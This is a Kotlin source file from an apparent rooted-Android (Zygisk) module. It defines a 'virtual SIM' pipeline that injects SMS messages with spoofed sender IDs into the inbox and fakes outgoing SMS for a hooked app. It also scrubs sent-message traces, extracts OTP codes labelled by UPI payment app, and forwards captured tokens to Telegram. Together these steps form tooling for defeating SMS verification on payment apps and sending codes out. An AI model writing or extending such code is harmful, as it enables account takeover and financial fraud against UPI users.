package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log

/**
 * Virtual SIM — bina real SIM ke sender ID + SMS inject / intercept pipeline.
 */
object VirtualSmsPipeline {

    private const val TAG = "VirtualSmsPipeline"

    fun injectIncoming(context: Context, senderId: String, body: String): Boolean {
        val appContext = context.applicationContext
        val sender = senderId.trim()
        val text = body.trim()
        if (sender.isBlank() || text.isBlank()) return false

        val configManager = ConfigManager(appContext)
        val config = configManager.load()

        val inserted = SmsSenderRewriter.injectInboxMessage(appContext, sender, text)
        if (!inserted) {
            Log.w(TAG, "Inject failed sender=$sender")
            return false
        }

        deliverCaptured(appContext, configManager, config, sender, sender, text, "incoming")
        try {
            appContext.contentResolver.notifyChange(android.provider.Telephony.Sms.CONTENT_URI, null)
        } catch (_: Exception) {}
        Log.i(TAG, "Virtual incoming SMS from $sender")
        return true
    }

    fun simulateOutgoing(context: Context, recipient: String, body: String): Boolean {
        val appContext = context.applicationContext
        val dest = recipient.trim()
        val text = body.trim()
        if (dest.isBlank() || text.isBlank()) return false

        val configManager = ConfigManager(appContext)
        val config = configManager.load()
        if (!SmsMatcher.shouldInterceptOutgoing(config, dest, text)) {
            Log.w(TAG, "Outgoing not allowed for hooked app")
            return false
        }

        deliverCaptured(appContext, configManager, config, dest, dest, text, "outgoing")
        OutgoingSmsCleaner.scrubSentIfNeeded(appContext, dest, text)
        Log.i(TAG, "Virtual outgoing SMS to $dest (SIM blocked)")
        return true
    }

    private fun deliverCaptured(
        context: Context,
        configManager: ConfigManager,
        config: ModuleConfig,
        rawPeer: String,
        displayPeer: String,
        body: String,
        direction: String
    ) {
        val interceptDisplay = SmsMatcher.interceptDisplay(config, displayPeer, configManager)
        val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
        val label = ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
        val otp = LastOtp(
            otp = token,
            sender = interceptDisplay,
            body = body,
            phone = interceptDisplay,
            messageLabel = label,
            direction = direction,
            rawPeer = rawPeer,
            capturedAt = System.currentTimeMillis()
        )
        OtpCaptureWriter.write(context, otp)
        OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
        if (SmsMatcher.shouldForwardToTelegram(config, rawPeer, body, direction)) {
            TokenForwarder(configManager, context).forward(otp)
        }
    }
}
